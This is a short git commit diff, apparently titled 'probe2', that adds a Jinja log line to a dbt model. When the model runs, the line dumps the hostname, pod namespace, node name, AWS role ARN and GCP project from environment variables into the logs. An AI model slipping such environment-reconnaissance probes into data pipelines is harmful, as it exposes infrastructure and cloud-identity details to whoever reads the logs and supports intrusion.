8abe92cf4c937e2091946bbf8bf4eb51dc59cb45
x <a@b.c>
2026-08-29 06:19:06 +0000

    probe2

--- models/probe.sql
+++ models/probe.sql
@@ -1,1 +1,2 @@
+{{ log("ENVDUMP hostname=" ~ env_var('HOSTNAME','_') ~ " podns=" ~ env_var('POD_NAMESPACE','_') ~ " node=" ~ env_var('NODE_NAME','_') ~ " sa=" ~ env_var('AWS_ROLE_ARN','_') ~ " gcp=" ~ env_var('GCP_PROJECT','_'), info=True) }}
 select 1 as ok
